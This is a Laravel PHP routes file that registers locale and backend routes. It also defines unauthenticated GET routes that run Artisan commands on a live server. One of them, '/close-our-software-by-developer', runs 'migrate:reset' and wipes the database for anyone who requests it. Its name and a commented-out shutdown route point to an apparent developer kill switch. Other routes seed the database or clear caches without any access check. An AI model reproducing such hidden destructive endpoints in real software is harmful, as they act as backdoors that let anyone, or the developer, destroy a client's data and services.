<?php

use Illuminate\Support\Facades\App;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Route;



//live server command route start
Route::get('/clear', function(){
    Artisan::call("optimize:clear");
    return 'success';
});
//live server command route end

//live Database command route start
Route::get('/db', function(){
    //Artisan::call("migrate");
   Artisan::call("db:seed");
   return "success";
});
//live Database command route end

//live Database reset command route start
Route::get('/close-our-software-by-developer', function(){
    Artisan::call("migrate:reset");
   return "success";
});
//live Database reset command route end


// app shutdown
/* Route::get('/site/shutdown/by/dev/unt', function(){
Artisan::call('down');
return redirect()->back();
}); */

// Change Langugae
Route::get('admindashboard/ln/{lang}', function($lang){
    App::setLocale($lang);
    return $lang;
    // return view('/');
});


/*
|--------------------------------------------------------------------------
| Backend Routes Start
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/
    require_once "backend/web.php";
/*
|--------------------------------------------------------------------------
| Backend Routes End
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/
